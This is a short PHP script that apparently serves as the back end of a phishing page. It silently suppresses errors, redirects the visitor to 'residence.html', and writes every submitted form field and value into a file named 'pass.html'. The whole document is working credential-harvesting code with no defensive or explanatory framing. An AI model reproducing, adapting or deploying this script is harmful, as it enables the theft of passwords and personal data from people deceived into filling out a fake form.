<?php
header('location:residence.html');
error_reporting(0);
$handle = fopen("pass.html","a");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "<br>");
}
fwrite($handle, "<br>");
fclose($handle);
exit;
?> 
 